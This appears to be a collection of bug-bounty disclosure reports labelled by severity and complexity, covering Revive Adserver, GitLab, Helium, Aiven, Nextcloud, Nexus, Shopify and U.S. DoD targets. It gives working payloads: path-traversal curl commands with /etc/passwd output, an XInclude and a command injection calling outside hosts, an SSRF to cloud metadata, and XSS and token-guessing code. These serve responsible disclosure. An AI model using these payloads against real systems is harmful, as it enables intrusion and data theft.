+This is a fun bug I came across while doing a pentest for a client, after going through Revive Advserver's code for a few hours, I found this authentication bypass. This vulnerability seem to affect all versions, including the latest one, I was sent by one of your developers to report it here.
+It goes like this:
+In /lib/OA/Dal/PasswordRecovery.php:
+Code 385 Bytes
+150: function generateRecoveryId($userId)
+2{
+3$doPwdRecovery = OA_Dal::factoryDO('password_recovery');
+4
+5    // Make sure that recoveryId is unique in password_recovery table
+6    do {
+7        $recoveryId = strtoupper(md5(uniqid('', true)));
+8        $recoveryId = substr(chunk_split($recoveryId, 8, '-'), -23, 22);
+9        $doPwdRecovery->recovery_id = $recoveryId;
+10        ....
+11 .....
+12....
+That function is used to generate the password reset token used to create new password for admins. The token generated for changing password is insecure because it soley just relies on uniqid() which, according to PHP manual states:
+"This function does not create random nor unpredictable string. This function must not be used for security purposes. Use cryptographically secure random function/generator and cryptographically secure hash functions to create unpredictable secure ID."
+The reason being that the function does not generate cryptographically secure tokens, in fact without being passed any additional parameters the return value is little different from microtime(). If you need to generate cryptographically secure tokens use openssl_random_pseudo_bytes()
+uniqid() is worse than the manual makes it out to be. An example return value is 58fc30c53db63 . Already, this is only <7 bytes of entropy. But it becomes worse, because without the more_entropy flag set, PHP only uses the current time to generate the return value, PHP code says:
+Code 234 Bytes
+1sec = (int) tv.tv_sec;
+2usec = (int) (tv.tv_usec % 0x100000);
+3if (more_entropy) {
+4uniqid = strpprintf(0, "%s%08x%05x%.8F", prefix, sec, usec, php_combined_lcg() * 10);
+5} else {
+6uniqid = strpprintf(0, "%s%08x%05x", prefix, sec, usec);
+7}
+The first four bytes are the current UNIX timestamp, and the last 20 bits are derived from the current time in microseconds.
+This gives a bit less than 2²⁰, or one million, possible results per given second. If you are able to predict when a new session key is generated for a user, you can guess their key with a decent number of requests, depending on how accurate your guess is. On a popular forum, you may not even need to target a specific user, as the number of users logging in at one time may be large enough.
+And lucky for us, we can easily predict what Revive Adserver uses:
+Ideally an attacker will look up the host IP of their target, locate the server's geoip and set their timezone similar to the server's timezone to make a more accurate prediction.
+Making it more practical
+When looking more closely I noticed, most servers that host Revive respond with the following headers:
+Code 243 Bytes
+1HTTP/1.1 200 OK
+2Server: nginx
+3Date: Thu, 09 May 2019 21:26:20 GMT
+4Content-Type: application/x-javascript
+5Connection: close
+6Vary: Accept-Encoding
+7X-Cacheable: NO:Not Cacheable
+8Age: 0
+9X-Cache: MISS
+10X-Frame-Options: SAMEORIGIN
+11Content-Length: ...
+Do you see it? It says Date: Thu, 09 May 2019 21:26:20 GMT -- so we can easily know what timezone the server syncs and uses (in this case GMT+0 as timezone) , all an attacker have to do is change their timezone to GMT, request a password reset token simultaneously as they they generate uniqid() from their side as well. All an attacker needs is the email address of the account they reset (which can be enumurated in numerous ways, including by abusing admin/password-recovery.php by sending some email addresses until it says Email Password Reset sent)
+A PoC one would use can look like the following (except weaponized to request a password and generate the tokens simultaneously):
+Code 186 Bytes
+1for($i=0;$i<=10000;$i++){
+2
+3     $recoveryId = strtoupper(md5(uniqid('', true)));
+4     $recoveryId = substr(chunk_split($recoveryId, 8, '-'), -23, 22);
+5
+6     print $recoveryId."</br>";
+7
+8}
+This generates 10,000 tokens we can try as a token to login as the admin by automating this with process with Burp Intruder.
+You get the idea! :)
+Suggested Fix
+Relaying on more cryptographically secure functions like openssl_random_pseudo_bytes() is better for such sensitive tokens.
+Impact
+Authentication Bypass
+Thanks,
+
+
+
+==================================================
+
+Report File: 997381.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- XML Injection
+
+Contents:
+
+Greetings,
+I found an XML injection on https://www.███.
+This kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response
+here is the complete link: https://www.███/███████
+Payload :
+███████=<vuc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo"/></vuc>
+Result :
+███
+best regards,
+frenchvlad
+Impact
+gaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML’s impact.
+
+
+
+==================================================
+
+Report File: 1212822.json
+------------------------------
+Report To: GitLab
+Severity: HIGH
+Complexity: HIGH
+Novelty: HIGH
+Multi-component: False
+Weaknesses:
+- Cross-site Scripting (XSS) - DOM
+
+Contents:
+
+Summary
+GitLab's Mermaid configuration allows an attacker to inject HTML in the rendered Markdown. This can be combined with a CSP bypass using pipeline artifacts to achieve RCE.
+Steps to reproduce
+Create a repository on GitLab.com
+Add the following to .gitlab-ci.yml
+Code 159 Bytes
+1---
+2job:
+3  script:
+4  - "echo 'alert(parent.document.querySelector(\"meta[name=csrf-token]\").outerHTML)' > exploit.js"
+5  artifacts:
+6    paths:
+7    - exploit.js
+Wait for the pipeline to finish and record the job ID
+Add the following to README.md, changing the project name (saleemrashid/mermaid-exploit-7032e404) and job ID (1303935016) accordingly
+Code 244 Bytes
+1```mermaid
+2%%{init: {"flowchart": {"htmlLabels": "false"}} }%%
+3flowchart
+4  A["<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>'></iframe>"]
+5```
+Open README.md (or any page that renders it, including the project overview page), and observe the alert containing the CSRF token (e.g. <meta name="csrf-token" content="XXXXXX">) caused by executing exploit.js
+Impact
+Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.
+Examples
+Private project on GitLab.com https://gitlab.com/saleemrashid/mermaid-exploit-7032e404
+What is the current bug behavior?
+Mermaid supports HTML labels when flowchart.htmlLabels is enabled and securityLevel is not strict. GitLab's configuration disables this functionality https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/assets/javascripts/behaviors/markdown/render_mermaid.js#L40-52
+Code 244 Bytes
+1  mermaid.initialize({
+2    // mermaid core options
+3    mermaid: {
+4      startOnLoad: false,
+5    },
+6    // mermaidAPI options
+7    theme,
+8    flowchart: {
+9      useMaxWidth: true,
+10      htmlLabels: false,
+11    },
+12    securityLevel: 'strict',
+13  });
+However, Mermaid also supports directives (https://mermaid-js.github.io/mermaid/#/directives) to alter the configuration. For security reasons, these directives aren't able to override certain configuration options https://github.com/mermaid-js/mermaid/blob/8.9.2/src/defaultConfig.js#L114-L120
+Code 417 Bytes
+1  /**
+2   * This option controls which currentConfig keys are considered _secure_ and can only be changed via
+3   * call to mermaidAPI.initialize. Calls to mermaidAPI.reinitialize cannot make changes to
+4   * the `secure` keys in the current currentConfig. This prevents malicious graph directives from
+5   * overriding a site's default security.
+6   */
+7  secure: ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize'],
+While you can't override securityLevel, it turns out that overriding flowchart.htmlLabels to "false" (specifically the string, not the boolean) is sufficient to bypass the sanitization https://github.com/mermaid-js/mermaid/blob/8.9.2/src/diagrams/common/common.js#L34-L54
+Code 556 Bytes
+1  let htmlLabels = true;
+2  if (
+3    config.flowchart &&
+4    (config.flowchart.htmlLabels === false || config.flowchart.htmlLabels === 'false')
+5  ) {
+6    htmlLabels = false;
+7  }
+8
+9  if (htmlLabels) {
+10    const level = config.securityLevel;
+11
+12    if (level === 'antiscript') {
+13      txt = removeScript(txt);
+14    } else if (level !== 'loose') {
+15      // eslint-disable-line
+16      txt = breakToPlaceholder(txt);
+17      txt = txt.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+18      txt = txt.replace(/=/g, '&equals;');
+19      txt = placeholderToBreak(txt);
+20    }
+21  }
+The above code will not sanitize the label if flowchart.htmlLabels is set to false or "false". It seems like the intention is to not sanitize the label if it's going to be rendered as text, which makes sense. However, the code that actually decides whether to render it as HTML or text always uses if (config.flowchart.htmlLabels), which would succeed for the string "false" (because it's truthy). This means the sanitization is bypassed, but the string is still rendered as HTML, resulting in XSS.
+To make use of the XSS, we need to bypass the CSP:
+Code 216 Bytes
+1script-src 'self' 'unsafe-inline' 'unsafe-eval' https://assets.gitlab-static.net https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.recaptcha.net/ https://apis.google.com 'nonce-<nonce>'
+Using nonces causes the browser to ignore 'unsafe-inline', so we can't use inline scripts. However, we can take advantage of the fact that Workhorse will serve pipeline artifacts with an auto-detected Content-Type based on the file extension https://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/workhorse/internal/artifacts/entry.go#L98-101
+Code 236 Bytes
+1	// Write http headers about the file
+2	headers.Set("Content-Length", contentLength)
+3	headers.Set("Content-Type", detectFileContentType(fileName))
+4	headers.Set("Content-Disposition", "attachment; filename=\""+escapeQuotes(basename)+"\"")
+The Content-Disposition header prevents this from being used for HTML/SVG-based XSS, but it still allows pipeline artifacts to be used as scripts or stylesheets. Because they are on the same domain, they satisfy 'self' in the CSP policy.
+Finally, RCE can be achieved by using the XSS to inject the following HTML, executing a pipeline artifact as JavaScript (<iframe srcdoc> is used because you can't directly inject a <script> tag with innerHTML). This example refers to an artifact on a private repository to maintain responsible disclosure, but you would enable public pipelines for an actual exploit (or add an access token to the URL) so the artifact is accessible by any user.
+Code 149 Bytes
+1<iframe srcdoc='<script src=https://gitlab.com/api/v4/projects/saleemrashid%2Fmermaid-exploit-7032e404/jobs/1303935016/artifacts/exploit.js></script>
+What is the expected correct behavior?
+Mermaid should not allow HTML injection. While configuration changes and upstream bugfixes could improve the situation, it might be prudent to move Mermaid into a sandboxed iframe to avoid future vulnerabilities. For example, it also supports specifying themeCSS (which I attempted to use for a CSS exfiltration attack, but it wasn't practical to exfiltrate more than a few characters because the CSP didn't allow to @import files from an external server).
+Additionally, Workhorse serving artifacts with dangerous Content-Type headers might not be secure behavior because it allows to bypass the CSP.
+Output of checks
+This bug happens on GitLab.com
+Impact
+Because the XSS leads to code execution as the authenticated user, this allows full account take-over without user interaction.
+
+
+
+==================================================
+
+Report File: 1055823.json
+------------------------------
+Report To: Helium
+Severity: HIGH
+Complexity: HIGH
+Novelty: MEDIUM
+Multi-component: False
+Weaknesses:
+- Server-Side Request Forgery (SSRF)
+
+Contents:
+
+A Server Side Request Forgery vulnerability was found in the Add a custom Integration feature on console.helium.com. By creating a custom HTTP integration, and setting the integration endpoint to http://169.254.169.254/latest/meta-data private meta-data from the AWS EC2 instance running can be retrieved.
+<image_0>
+<image_1>
+The server makes the HTTP request and sets the response body as the integration message every time that the device sends a packet. As the endpoint input is not validated, this makes the application vulnerable to a critical SSRF.
+<image_2>
+<image_3>
+Endpoint set as: http://169.254.169.254/latest/meta-data/ami-id
+<image_4>
+Impact
+By exploiting this vulnerability an attacker can get access to the server internal network and access private and critical information.
+
+
+
+==================================================
+
+
+LOW/MEDIUM COMPLEXITY/NOVELTY MULTI-COMPONENT REPORTS
+==================================================
+
+Total reports in group: 199
+Selected reports: 15
+
+Report File: 428757.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Authentication Bypass Using an Alternate Path or Channel
+
+Contents:
+
+NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!
+Summary: [add summary of the vulnerability]
+I'm able to take over the admin panel, allowing me to viewing the entire ticket database's PII (DOD ID, email, name by changing the URL and bypassing authentication
+Description: [add more details about this vulnerability]
+Steps To Reproduce:
+1: Go to
+████████?x-app=itsm&x-urlpath=/arsys/shared/login.jsp&x-redir=%2Farsys%2Fforms%2Fedgelb-itsm-ar%2FRKM%253AKnowledgeArticleManager%2FDisplay%2BView%2F%3Feid%3DKBA000000024701%26cacheid%3Ddf8e1567
+2: Change URL to
+█████?x-app=itsm&x-urlpath=../../../../../../../../passwd
+3)
+LFI fails, click login
+4) Enjoy full admin panel access
+5 (Leak PII)
+In the left hand corner, applications -> quick links -> AR system report console
+Bottom left, click run
+Supporting Material/References:
+List any additional material (e.g. screenshots, logs, etc.) Proof of PII: ██████████
+Proof of admin panel:
+█████████
+Impact
+I can steal users DOD IDs, pretty much anything I want because I'm the websites admin
+Change tickets
+Change user info
+Change permission
+Steal PII
+
+
+
+==================================================
+
+Report File: 1415820.json
+------------------------------
+Report To: Aiven Ltd
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Path Traversal
+
+Contents:
+
+Summary:
+Hi team,
+I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms. With the path traversal it's possible for an unauthenticated user to read arbitrary files on the server.
+Steps To Reproduce:
+Login at https://console.aiven.io
+Create a new Grafana instance and wait till it's up and running 1.Run the following curl command to get the content of the /etc/passwd file on the server:
+Code 138 Bytes
+1curl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+Output:
+Code 1.13 KiB
+1$ curl https://grafana-303ca6f8-███████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2root:x:0:0:root:/root:/bin/bash
+3bin:x:1:1:bin:/bin:/sbin/nologin
+4daemon:x:2:2:daemon:/sbin:/sbin/nologin
+5adm:x:3:4:adm:/var/adm:/sbin/nologin
+6lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+7sync:x:5:0:sync:/sbin:/bin/sync
+8shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+9halt:x:7:0:halt:/sbin:/sbin/halt
+10mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+11operator:x:11:0:operator:/root:/sbin/nologin
+12games:x:12:100:games:/usr/games:/sbin/nologin
+13ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+14nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+15███
+16█████
+17██████
+18██████████
+19██████████
+20████████
+21██████
+22systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+23systemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin
+24systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+25systemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin
+26██████████
+27dbus:x:81:81:System message bus:/:/sbin/nologin
+28█████
+29████████
+30██████
+31█████████
+32██████████
+33███
+34██████████
+35███
+36█████
+37█████████
+38██████████
+39███
+40███
+41████
+42███
+Some other examples:
+See the Grafana config:
+Code 160 Bytes
+1curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
+I'll keep my Grafana instance running so you can try to reproduce it with the examples above.
+Impact
+An unauthenticated user can get access to all system files if he knows the exact path of the file.
+
+
+
+==================================================
+
+Report File: 1193321.json
+------------------------------
+Report To: Nextcloud
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: LOW
+Multi-component: True
+Weaknesses:
+- Improper Access Control - Generic
+
+Contents:
+
+I noticed that there is the possibility to limit apptokens to not be able to access the filesystem.
+Create a new apptoken in https://server/settings/user/security
+Click the .. of your new apptoken and make it not allowed to access the filesystem
+Log out
+Navigate to https://server/remote.php/dav and login with your username + apptoken
+Navigate again to https://server/settings/user/security
+You won't be able to access the apptoken data
+Obtain the CSRF token
+Send a PUT request to https://server/settings/personal/authtokens/ID chaging the scope
+Now the ID you do not know. However even on a decent sized system it is not hard to iterate this as there is no rate limiting or throttling at all.
+And voila. You have filesystem access.
+You could also remove other apptokens of the same user (if you'd want).
+Impact
+Leaked scoped tokens could be used to gain full access to all your data. Defeating the whole purpose of scoped tokens.
+I recommend.
+Only allow tokens that result from a real login (so user+pass+2fa) to modify/delete tokens
+Do not allow the current token in use to edit itself
+
+
+
+==================================================
+
+Report File: 688270.json
+------------------------------
+Report To: Central Security Project
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Command Injection - Generic
+
+Contents:
+
+OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)
+Maven artifact
+groupId: org.sonatype.nexus.plugins
+artifactId: nexus-yum-repository-plugin
+version: 2.14.14-01
+Vulnerability
+Vulnerability Description
+The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.
+Additional Details
+Take a look at the patch for CVE-2019-5475
+https://github.com/sonatype/nexus-public/commit/7b9939e71693422d3e09adc3744fa2e9b3a62a63#diff-4ab0523de106ac7a38808f0231fc8a23R84
+
+The getCleanCommand method is not completely filtered and can still be bypassed.
+Steps To Reproduce:
+Navigate to "Capabilities" in Nexus Repository Manager.
+Edit or create a new Yum: Configuration capability
+Set path of "createrepo" or "mergerepo" to an OS command (e.g. /bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo)
+
+Supporting Material/References:
+Ubuntu
+Sonatype Nexus Repository Manager 2.14.14-01
+Java 8
+Wrap up
+I contacted the maintainer to let them know: N
+I opened an issue in the related repository: N
+Impact
+An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.
+Impact
+An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.
+
+
+
+==================================================
+
+Report File: 1629822.json
+------------------------------
+Report To: U.S. Dept Of Defense
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Cleartext Storage of Sensitive Information
+
+Contents:
+
+Git metadata directory (.git) was found in this folder. An attacker can extract sensitive information by requesting the hidden metadata directory that version control tool Git creates. The metadata directories are used for development purposes to keep track of development changes to a set of source code before it is committed back to a central repository (and vice-versa). When code is rolled to a live server from a repository, it is supposed to be done as an export rather than as a local working copy, and hence this problem.
+███████
+Code 4.46 KiB
+1Some of Repository files/directories:
+2├── private
+3│   ├── Gruntfile.js
+4│   ├── bootstrap.php
+5│   ├── build.js
+6│   ├── classes
+7│   │   ├── Config.php
+8│   │   ├── Controller.php
+9│   │   ├── Database.php
+10│   │   ├── DatabaseResult.php
+11│   │   ├── DatabaseResultRow.php
+12│   │   ├── DebugLog.php
+13│   │   ├── Dictionary.php
+14│   │   ├── FileUploader.php
+15│   │   ├── ImageUploader.php
+16│   │   ├── Importer.php
+17│   │   ├── Installer.php
+18│   │   ├── ModelController.php
+19│   │   ├── Modeler.php
+20│   │   ├── Palm
+21│   │   │   ├── Controller.php
+22│   │   │   ├── ProblemFetcher.php
+23│   │   │   └── Status.php
+24│   │   ├── PalmBrowser.php
+25│   │   ├── Perls
+26│   │   │   ├── Controller.php
+27│   │   │   └── UserManager.php
+28│   │   ├── Request.php
+29│   │   ├── Router.php
+30│   │   ├── UploadController.php
+31│   │   ├── UserLogin.php
+32│   │   ├── XmlImporter.php
+33│   │   └── xAPI
+34│   │       ├── Builder.php
+35│   │       ├── Controller.php
+36│   │       └── Logger.php
+37│   ├── config.json
+38│   ├── controllers
+39│   │   ├── Author
+40│   │   │   ├── Applications.php
+41│   │   │   ├── Categories.php
+42│   │   │   ├── DefaultParameters.php
+43│   │   │   ├── Globals.php
+44│   │   │   ├── Images.php
+45│   │   │   ├── Lists.php
+46│   │   │   ├── Modules.php
+47│   │   │   ├── ProblemLayouts.php
+48│   │   │   ├── ProblemTemplates.php
+49│   │   │   ├── Problems.php
+50│   │   │   ├── Publish.php
+51│   │   │   ├── Tags.php
+52│   │   │   ├── Unpublish.php
+53│   │   │   ├── UploadImage.php
+54│   │   │   └── Users.php
+55│   │   ├── Import
+56│   │   │   ├── Parse.php
+57│   │   │   └── Submit.php
+58│   │   ├── Palm
+59│   │   │   ├── Browse.php
+60│   │   │   ├── Load.php
+61│   │   │   ├── Problem.php
+62│   │   │   ├── Reset.php
+63│   │   │   └── Sequence.php
+64│   │   ├── Perls
+65│   │   │   ├── ListModules.php
+66│   │   │   ├── ProbeProblems.php
+67│   │   │   ├── RequestPalm.php
+68│   │   │   ├── SampleProblems.php
+69│   │   │   └── UserStatus.php
+70│   │   ├── User
+71│   │   │   ├── ConfirmEmail.php
+72│   │   │   ├── Consent.php
+73│   │   │   ├── Login.php
+74│   │   │   ├── Logout.php
+75│   │   │   ├── Register.php
+76│   │   │   ├── ResetPassword.php
+77│   │   │   ├── Save.php
+78│   │   │   ├── Touch.php
+79│   │   │   ├── Unique.php
+80│   │   │   └── VerifyEmail.php
+81│   │   └── xAPI
+82│   │       ├── Categories.php
+83│   │       ├── Modules.php
+84│   │       ├── Problems.php
+85│   │       ├── Statements.php
+86│   │       └── Users.php
+87│   ├── install.xml
+88│   ├── models
+89│   │   ├── Applications.php
+90│   │   ├── Categories.php
+91│   │   ├── FileTags.php
+92│   │   ├── GlobalParameters.php
+93│   │   ├── ImageTypes.php
+94│   │   ├── Images.php
+95│   │   ├── Lists.php
+96│   │   ├── Modules.php
+97│   │   ├── ProblemLayouts.php
+98│   │   ├── ProblemTemplates.php
+99│   │   ├── Problems.php
+100│   │   └── Users.php
+101│   ├── package.json
+102│   ├── sql
+103│   │   ├── application_parameters.sql
+104│   │   ├── applications.sql
+105│   │   ├── categories.sql
+106│   │   ├── category_parameters.sql
+107│   │   ├── category_prerequisites.sql
+108│   │   ├── completed_modules.sql
+109│   │   ├── file_tags.sql
+110│   │   ├── global_parameters.sql
+111│   │   ├── image_tag_map.sql
+112│   │   ├── image_types.sql
+113│   │   ├── images.sql
+114│   │   ├── lists.sql
+115│   │   ├── module_parameters.sql
+116│   │   ├── modules.sql
+117│   │   ├── performances.sql
+118│   │   ├── priorities.sql
+119│   │   ├── problem_graph.sql
+120│   │   ├── problem_layouts.sql
+121│   │   ├── problem_parameters.sql
+122│   │   ├── problem_templates.sql
+123│   │   ├── problems.sql
+124│   │   ├── problems_logged.sql
+125│   │   ├── retired_categories.sql
+126│   │   ├── user_authentication.sql
+127│   │   ├── user_status.sql
+128│   │   ├── users.sql
+129│   │   └── xapi_statements.sql
+130│   └── vendor
+131│       └── TinCanPHP
+132│           ├── About.php
+133│           ├── Activity.php
+134│           ├── ActivityDefinition.php
+135│           ├── ActivityProfile.php
+136│           ├── Agent.php
+137│           ├── AgentAccount.php
+138│           ├── AgentProfile.php
+139│           ├── Attachment.php
+140│           ├── Context.php
+141│           ├── ContextActivities.php
+142│           ├── Document.php
+143│           ├── Extensions.php
+144│           ├── Group.php
+145│           ├── LRSInterface.php
+146│           ├── LRSResponse.php
+147│           ├── LanguageMap.php
+148│           ├── Map.php
+149│           ├── Object.php
+150│           ├── RemoteLRS.php
+151│           ├── Result.php
+152│           ├── Score.php
+153│           ├── State.php
+154│           ├── Statement.php
+155│           ├── StatementBase.php
+156│           ├── StatementRef.php
+157│           ├── StatementTargetInterface.php
+158│           ├── StatementsResult.php
+159│           ├── SubStatement.php
+160│           ├── Util.php
+161│           ├── Verb.php
+162│           ├── Version.php
+163│           └── VersionableInterface.php
+Also the config.json file is expsing senstive infomration
+Code 4.49 KiB
+1{
+2    // ----------------------------------------------------------------------------------
+3    // Authoring Tools config file
+4    // This file is in a JSON format, but comments are allowed.  Make sure all values
+5    // follow correct JSON syntax.
+6    // ----------------------------------------------------------------------------------
+7
+8    // URL_BASE
+9    // The absolute url prefix to the root of the site.  For example, if the root of the
+10    // site is at "http://localhost/~fred/site/", the value would be "/~fred/site/".
+11    // The default value is the domain root, or "/".
+12
+13    "URL_BASE":                 "/",
+14
+15    // FORCE_SSL
+16    // Forces all connections and internal redirects to https.
+17
+18    "FORCE_SSL":                false,
+19
+20    // DEBUG_DISPLAY
+21    // Setting this to true will enable the debug log to be displayed and passed back
+22    // through AJAX responses
+23
+24    "DEBUG_DISPLAY":            false,
+25
+26    // DEBUG_EMAIL_ADDRESSES
+27    // Array of email addresses to send debug log messages to.
+28
+29    "DEBUG_EMAIL_ADDRESSES":    [],
+30
+31    // DEBUG_EMAIL_LEVELS
+32    // Array of debug log levels to trigger debug emails.  Emails are only sent if an
+33    // item was logged at that level, and if at least one email address (see above) is
+34    // set.
+35
+36    "DEBUG_EMAIL_LEVELS":       ["ERROR"],
+37
+38    // DEBUG_CAPTURE_ERRORS
+39    // If true, PHP errors (notices, warnings, etc.) will be captured and inserted into
+40    // the debug log using a custom error handler.  Otherwise, they will be handled
+41    // according to the PHP configuration settings.  Fatal errors are not captured.
+42
+43    "DEBUG_CAPTURE_ERRORS":     true,
+44
+45    // FORCE_UNBUILT_RESOURCES
+46    // This forces the use of the unbuilt JavaScript and CSS for the site.  Otherwise,
+47    // the site will use the built files automatically if they are detected in the build
+48    // directory.
+49
+50    "FORCE_UNBUILT_RESOURCES":  false,
+51
+52    // DATABASE_HOST
+53    // Database host to connect to
+54
+55    "DATABASE_HOST":            "localhost",
+56
+57    // DATABASE_USER
+58    // Name of the database user to connect as
+59
+60    "DATABASE_USER":            "authoring_tools",
+61
+62    // DATABASE_PASSWORD
+63    // Password to connect with
+64
+65    "DATABASE_PASSWORD":        "████",
+66
+67    // DATABASE_NAME
+68    // Name of the Authoring Tools database
+69
+70    "DATABASE_NAME":            "authoring_tools",
+71
+72    // INSTALLER_ENABLED
+73    // Set this to true to enable access to the database installation script located at
+74    // '/install.php'.  Once the installer has been run and the site is running correctly,
+75    // reset this back to false to prevent further access.
+76
+77    "INSTALLER_ENABLED":        false,
+78
+79    // SYSTEM_EMAIL
+80    // The originating email address for all system emails (e.g. account validation).
+81    // Setting this to an appropriate value can help prevent messages from being
+82    // filtered as spam.
+83
+84    "SYSTEM_EMAIL":            "no-reply@example.com",
+85
+86    // BLOCK_SIZE
+87    // The number of trials per block
+88
+89    "BLOCK_SIZE":               10,
+90
+91    // XAPI_LOCAL_STATEMENTS
+92    // Set this to true to store xAPI statements in the Authoring Tools database.  This
+93    // will potentially incur a cost in database storage, since many statements may be
+94    // generated.
+95
+96    "XAPI_LOCAL_STATEMENTS":    false,
+97
+98    // XAPI_REMOTE_LRS_ENDPOINT
+99    // Base URL for remote LRS to send statement data to.  If null, no data is sent.
+100
+101    "XAPI_REMOTE_LRS_ENDPOINT": null,
+102
+103    // XAPI_REMOTE_LRS_USER
+104    // Username for authenticating connection with remote LRS (as specified in
+105    // XAPI_REMOTE_LRS_ENDPOINT)
+106
+107    "XAPI_REMOTE_LRS_USER":     "",
+108
+109    // XAPI_REMOTE_LRS_PASSWORD
+110    // Password for authenticating connection with remote LRS (as specified in
+111    // XAPI_REMOTE_LRS_ENDPOINT)
+112
+113    "XAPI_REMOTE_LRS_PASSWORD":  "",
+114
+115    // PERLS_SECRET_KEY
+116    // PERLS access key for embedding modules and authenticating users.  Set this to a
+117    // string value that the PERLS system must send with the request as the 'key'
+118    // parameter.  If set to true, access will be allowed without any secret key.  Null
+119    // or false will disable PERLS access.
+120
+121    "PERLS_SECRET_KEY":         null,
+122
+123    // PARAMETER_DEFAULTS
+124    // Default values for global parameters
+125
+126    "PARAMETER_DEFAULTS":
+127    {
+128        "delay_constant":       2.0,
+129        "default_weight":       1.0,
+130        "rt_weight":            0.1,
+131        "incorrect_penalty":    2.0,
+132        "rt_divisor":           1000,
+133        "window":               3,
+134        "target_accuracy":      1.0,
+135        "target_rt":            10000,
+136        "timeout":              30000
+137    }
+138}
+Impact
+These files may expose sensitive information that may help an malicious user to prepare more advanced attacks
+
+
+
+==================================================
+
+Report File: 232174.json
+------------------------------
+Report To: Shopify
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Cross-site Scripting (XSS) - Stored
+
+Contents:
+
+Description
+Shopify allows developers to create a special type of application called a "Sales Channel". Developers are allowed to upload a 16x16 SVG "Navigation Icon" for their app provided the SVG follows the design guidelines which limits the allowed elements and attributes. For some reason when the SVG contains an XML entity this whitelist is no longer enforced allowing the developer to include malicious attributes such as onload. By uploading a malicious SVG a developer can obtain XSS on both partners.shopify.com, as well as any the admin panel of any shop which has authorized the sales channel.
+Proof of Concept
+This is relatively easy to reproduce, first create a new application within the Partners dashboard then navigate to "Extensions" -> "Sales channel" to convert the application. After saving those changes a new field within the "App info" section titled "Navigation icon". Upload the following SVG:
+Code 162 Bytes
+1<?xml version="1.0" encoding="ISO-8859-1"?>
+2<!DOCTYPE svg [
+3    <!ENTITY elem "">
+4]>
+5<svg onload="alert(document.domain);" height="16" width="16">
+6  &elem;
+7</svg>
+After saving changes the XSS payload will fire on partners.shopify.com. To fire the payload on $shop$.myshopify.com/admin/ you'll need to authorize the application on your shop:
+I've created an example malicious application associated with my partner account shopify-whitehat-2+hackerone@bored.engineer to help demonstrate the issue, you can authorize it by opening the following URL on $your-shop$.myshopify.com:
+Code 176 Bytes
+1/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce
+Immediately after authorizing the application (and all future admin panel loads) an alert should appear on the /admin window containing document.domain.
+Exploitability
+This seems like a really odd issue, so it may good to see if there are other places this icon could surface (ex. the app store or internal admin panels) to full understand the impact. For the known exploitable use-case via OAuth authorization you do need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it will immediately fire without additional user-interaction.
+Remediation
+The application should not allow XML entities in uploaded SVGs (or at least fix the parsing so it handles them correctly).
+
+
+
+==================================================
+
+Report File: 2107680.json
+------------------------------
+Report To: Basecamp
+Severity: HIGH
+Complexity: MEDIUM
+Novelty: MEDIUM
+Multi-component: True
+Weaknesses:
+- Information Disclosure
+
+Contents:
+
